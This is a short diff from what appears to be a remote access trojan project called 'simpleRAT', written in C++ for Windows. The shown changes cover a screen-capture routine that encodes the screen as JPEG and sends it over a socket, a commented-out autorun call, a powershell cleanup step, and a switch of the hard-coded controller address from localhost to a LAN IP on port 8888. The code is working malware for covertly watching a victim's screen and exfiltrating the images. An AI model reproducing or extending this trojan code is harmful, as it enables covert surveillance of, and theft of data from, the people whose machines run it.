@@ -278,6 +278,7 @@ int captureScreen(SOCKET s)
         GetEncoderClsid(L"image/jpeg", &encoder);
         //Gdiplus::Status status = image.Save(L"D:\\simpleRAT\\simpleRAT\\test.jpeg", &encoder);
         Gdiplus::Status status = image.Save(istream, &encoder);
+        //status = image.Save(L"D:\\simpleRAT\\simpleRAT\\test.jpeg", &encoder);
 
         DeleteObject(destDc);
         DeleteObject(destDc);
@@ -296,7 +297,6 @@ int captureScreen(SOCKET s)
     send(s, (char*)(&status), 4, 0);
     if (status == S_OK)
     {
-        send(s, "\x00\x00\x00\x00", 4, 0);
         send(s, imageBuf, len, 0);
     }
     else
@@ -326,7 +326,6 @@ void cleanUp()
     ZeroMemory(&powershell, sizeof(powershell));
 }
 
-
 int main()
 { 
     //setAutoRun();
@@ -337,7 +336,7 @@ int main()
     struct addrinfo* server = NULL;
 
     // Resolve the server address and port
-    iResult = getaddrinfo("127.0.0.1", "8888", NULL, &server);
+    iResult = getaddrinfo("192.168.43.82", "8888", NULL, &server);
     if (iResult != 0) 
     {
         printf("getaddrinfo failed: %d\n", iResult);
